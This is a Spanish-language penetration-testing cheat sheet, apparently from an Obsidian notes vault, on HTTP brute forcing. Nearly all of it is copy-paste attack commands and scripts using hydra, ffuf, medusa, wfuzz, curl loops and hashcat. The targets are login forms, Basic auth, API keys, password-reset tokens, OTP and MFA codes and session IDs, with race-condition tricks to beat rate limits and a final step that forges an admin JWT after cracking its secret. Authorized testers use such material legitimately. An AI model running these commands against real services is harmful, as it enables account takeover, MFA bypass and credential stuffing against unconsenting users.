---
aliases:
  - Login Brute
  - API Key Brute
  - JWT Secret Crack
  - OTP Brute
tags:
  - type/technique
  - vuln/brute-force
  - technique/credential-access
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[HTTP Brute Forcing]]"
  - "[[JWT Attacks]]"
  - "[[Authentication & Authorization Bypass]]"
---
# HTTP Brute Forcing - Targets de Ataque

***

## Login Forms (Form-Based)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `hydra -L users.txt -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"` | Form POST brute con failure-string match | Standard. |
| `hydra -L users.txt -P passwords.txt target.com https-post-form "/login:username=^USER^&password=^PASS^:H=Cookie\: session=XYZ:F=Invalid"` | Form brute con cookie pre-set | Stateful form. |
| `hydra -L users.txt -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^&csrf=$TOKEN:S=Welcome"` | Form con CSRF token pre-fetched | CSRF-required forms. |
| `ffuf -w pass.txt -X POST -u 'https://target/login' -d 'user=admin&pass=FUZZ' -fc 401 -mc 200` | ffuf modern brute single user | Quick variant. |
| `ffuf -w combos.txt:COMBO -X POST -u 'https://target/login' -d 'user=COMBO1&pass=COMBO2'` (con combos.txt formato `user:pass`) | Credential stuffing | Stuffing attack. |
| `python3 -c "import requests; ..."` con headless browser (Puppeteer) | JS-required submit | Anti-bot apps. |
| `curl -s https://target/login \| grep -oE 'csrf_token[^"]+"[^"]+"' \| head -1` | Pre-fetch CSRF token | Pre-attack. |
| `curl -X POST -H "Referer: https://target/login" -d "..." https://target/login` | Referer-required form | Anti-CSRF. |
| `hydra -L users.txt -P passwords.txt -t 1 -W 5 ...` (slow throttle) | Slow brute para evitar rate limit | Lockout-aware. |
^bf-target-login

### Hydra HTTP form workflow

```bash
# Standard form POST con failure string
hydra -L users.txt -P passwords.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# Con cookie required
hydra -L users.txt -P passwords.txt \
  target.com https-post-form \
  "/login:username=^USER^&password=^PASS^:H=Cookie\: session=XYZ:F=Invalid"

# Success-string match (en lugar de failure)
hydra -L users.txt -P passwords.txt \
  target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:S=Welcome"
```

___

## Basic / Digest / NTLM Authentication

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `hydra -L users.txt -P passwords.txt target.com http-get /admin` | HTTP Basic brute | Basic Auth challenge. |
| `hydra -L users.txt -P passwords.txt -s 443 target.com https-get /admin` | HTTPS Basic | TLS. |
| `for p in $(cat passwords.txt); do curl -s -o /dev/null -w '%{http_code}' -u "admin:$p" https://target/admin \| grep -q 200 && echo "FOUND: $p" && break; done` | Bash bulk basic brute | Manual sin Hydra. |
| `hydra -L users.txt -P passwords.txt -m / target.com http-head` | HEAD method | Faster (no body). |
| `medusa -h target -U users.txt -P passwords.txt -M http -m DIR:/admin -m AUTH:BASIC` | Medusa alt para Basic | Alt tool. |
| `crackmapexec http://target/admin -u users.txt -p passwords.txt` | CME HTTP brute (con http module) | Multi-protocol tool. |
| `curl -H "Authorization: Bearer FUZZ" https://target/api/x` con ffuf | Bearer token brute | Modern API. |
| `for k in $(cat keys.txt); do curl -s -o /dev/null -w '%{http_code}' -H "X-API-Key: $k" https://target/api/x \| grep -q 200 && echo "FOUND: $k"; done` | Custom API key header brute | App-specific. |
^bf-target-basic

___

## API Keys / Tokens / Secrets

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ffuf -w keys.txt -u 'https://target/api/?api_key=FUZZ' -fc 401,403 -mc 200` | API key URL param brute | URL-based API key. |
| `ffuf -w tokens.txt -H "Authorization: Bearer FUZZ" -u https://target/api/me -fc 401 -mc 200` | Bearer token brute | Header-based. |
| `for code in {000000..999999}; do curl -sI "https://target/reset?email=victim&token=$code" \| grep -q 302 && echo "FOUND $code" && break; done` | 6-digit reset token brute | Predictable token. |
| `ffuf -w numeric-6-digit.txt -X POST -u https://target/verify -d "token=FUZZ" -fc 400` | Reset/verify token bruteforce | Form-based. |
| `wfuzz -z range,000000-999999 --hh 1234 https://target/2fa?code=FUZZ` | OTP 6-digit con response-length filter | Standard wfuzz. |
| `ffuf -w invite-tokens.txt -u https://target/invite/FUZZ -mc 200` | Invitation token brute | URL path token. |
| `python3 -c "import uuid; [print(uuid.uuid1()) for _ in range(100)]"` y probar UUIDs predecibles | UUIDv1 timestamp-based prediction | Predictable UUID gen. |
| `for i in {1..10000}; do TOK=$(python3 -c "print(hex($i)[2:])"); curl -sI "https://target/api/?token=$TOK"; done` | Sequential token brute | Sequential issuance. |
^bf-target-tokens

### Reset token brute

```bash
# 6-digit reset token
for code in {000000..999999}; do
  RESP=$(curl -s -o /dev/null -w '%{http_code}' \
    "https://target/reset?email=victim@x&token=$code")
  if [ "$RESP" = "302" ]; then
    echo "FOUND: $code"
    break
  fi
done
```

___

## OTP / MFA Codes

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ffuf -w numeric-4-digit.txt -X POST -u https://target/verify-otp -d "code=FUZZ" -H "Cookie: session=$S" -fc 400` | 4-digit OTP brute (10K combos) | Sin rate limit. |
| `ffuf -w numeric-6-digit.txt -X POST -u https://target/verify-otp -d "code=FUZZ" -H "Cookie: session=$S" -fc 400` | 6-digit OTP brute (1M combos) | Race + slow. |
| `seq -w 0 9999 \| while read code; do (curl -s -X POST -d "code=$code" -H "Cookie: session=$S" https://target/verify-otp &); done; wait` | Parallel bash brute | Race condition. |
| Turbo Intruder con `concurrentConnections=1, engine=Engine.BURP2` + payload `0000-9999` | HTTP/2 single-packet OTP brute | Modern race. |
| Burp Repeater group "Send in parallel single conn" con N requests con codes distintos | Race condition bypass rate limit | Single-packet attack. |
| `for code in $(seq -w 0 999999); do curl -sI -X POST -d "code=$code" -H "Cookie: session=$S" https://target/verify-otp \| grep -q "200 OK" && echo "FOUND: $code" && break; done` | Sequential 6-digit con early exit | Slow standard brute. |
| Backup code brute (8 chars alphanumeric): `crunch 8 8 -t %%%%%%%%` luego pipe a ffuf | Backup code brute | Recovery codes. |
^bf-target-otp

### OTP race brute

```bash
# Bash parallel 4-digit
for code in $(seq -w 0 9999); do
  (curl -s -X POST https://target/verify-otp \
    -d "code=$code" \
    -H "Cookie: session=$SESS" &)
done
wait

# O Burp Turbo Intruder con concurrentConnections=1, engine=Engine.BURP2
```

___

## Session Cookie / JWT Secret

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt` | JWT HS256 secret brute | Standard. |
| `python3 jwt_tool.py "$JWT" -C -d /usr/share/wordlists/rockyou.txt` | jwt_tool brute alternative | Quick. |
| `hashcat -m 16500 -a 3 jwt.txt ?l?l?l?l?l?l?l?l` | Mask attack 8 chars lowercase | Sin wordlist. |
| `hashcat -m 16500 jwt.txt rockyou.txt -r best64.rule` | Rules mutations | Cobertura ampliada. |
| `for i in {1..1000000}; do curl -sI -b "session=$(printf '%032d' $i)" https://target/ \| grep -q 200 && echo "FOUND $i"; done` | Sequential session ID brute | Predictable session. |
| `python3 -c "import base64; print(base64.b64decode('$SESSION_COOKIE'))"` y analyze structure | Decode cookie structure | Pre-brute analysis. |
| `hashcat -m 1450 hmac-cookie.txt rockyou.txt` (HMAC-SHA256) | Signed cookie HMAC crack | Custom signed cookies. |
| `python3 -c "import jwt; print(jwt.decode('$JWT', options={'verify_signature':False}))"` | Decode JWT structure | Pre-crack. |
^bf-target-session

### JWT secret crack workflow

```bash
JWT="eyJhbG..."

# Hashcat
echo "$JWT" > jwt.txt
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# jwt_tool
python3 jwt_tool.py "$JWT" -C -d /usr/share/wordlists/rockyou.txt

# Si cracked, forge admin JWT
python3 -c "import jwt; print(jwt.encode({'role':'admin','exp':9999999999}, 'CRACKED_SECRET', 'HS256'))"
```

***
